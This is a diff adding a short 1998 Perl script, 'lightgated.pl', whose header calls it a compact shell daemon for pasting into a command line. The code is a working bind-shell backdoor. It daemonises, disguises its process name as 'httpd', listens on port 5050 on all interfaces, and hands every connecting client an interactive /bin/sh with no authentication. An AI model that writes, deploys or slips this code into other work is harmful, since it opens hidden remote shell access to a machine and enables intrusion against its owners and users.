@@ -1,0 +1,41 @@
+#!/usr/bin/perl
+#
+# lightgated.pl
+#
+# Author: Liraz Siri <liraz@hushmail.com>
+# 
+# Copyright (c) 1998 Liraz Siri <liraz@hushmail.com>, Ariel, Israel
+#	        All rights reserved.
+#
+# Created: Tue Oct 20 04:22:34 IST 1998
+#
+# paste-a-foo(tm) compliant: .z (3 lines/232 bytes)
+#
+# Lightgated is an extremely simple, compact shell daemon written in perl,
+# designed to be executed from command line (perl -e ...), consisting of
+# no more then 3 lines of compressed code (re. lightgated.z.pl).
+#
+# Designed in the spirit of the lightgate package, .z versions of these
+# miniature applications offer full fuctionality while still complying
+# with strict paste-a-foo(tm) standards.
+#
+# Remember if it's not paste-a-foo(tm)!!! you can't paste it.
+
+use Socket;
+fork&&exit;
+$0="httpd";
+socket L,AF_INET,SOCK_STREAM,0;
+bind L,sockaddr_in(5050,INADDR_ANY) || exit;
+listen L,3;
+x:
+accept C,L;
+if(fork)
+{
+ open STDOUT,">&C";
+ open STDERR,">&C";
+ open STDIN,"<&C";
+ exec "/bin/sh -i";
+ exit;
+}
+close C;
+goto x;
